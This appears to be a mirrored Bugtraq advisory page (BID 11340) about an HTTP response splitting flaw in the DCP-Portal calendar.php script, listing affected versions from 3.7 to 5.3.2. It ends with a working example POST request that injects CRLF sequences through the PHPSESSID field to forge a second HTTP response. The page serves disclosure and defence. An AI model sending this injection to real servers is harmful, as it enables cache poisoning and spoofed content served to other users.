@@ -1,0 +1,128 @@
+#SpeeDr00t@Black Falcon<br>#bid11340<p><b><span style="font-size: 18pt;">DCP-Portal Calendar.PHP HTTP Response Splitting Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/11340/info">info</a><br><a href="http://www.securityfocus.com/bid/11340/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/11340/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/11340/solution">solution</a><br><a href="http://www.securityfocus.com/bid/11340/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				11340
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 06 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Oct 06 2004 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to "Alexander Antipov" &lt;antipov@SecurityLab.ru&gt;.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					DCP-Portal DCP-Portal 5.3.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.3.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.3 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.0.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 5.0.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.5.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.2 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.1 <br/>
+					
+				
+					DCP-Portal DCP-Portal 4.0 <br/>
+					
+				
+					DCP-Portal DCP-Portal 3.7 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following example is available:<br/><br/>POST /calendar.php?show=full_month HTTP/1.1<br/>Host: dcp-portal<br/>Content-Type: application/x-www-form-urlencoded<br/>Content-Length: 200<br/><br/>PHPSESSID=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2034%0d%0a%0d%0a%3chtml%3eScanned%20by%20PTsecurity%3c/html%3e%0d%0a&amp;s=1&amp;submit=1
+	
+		<ul>
+</ul>
+</div>
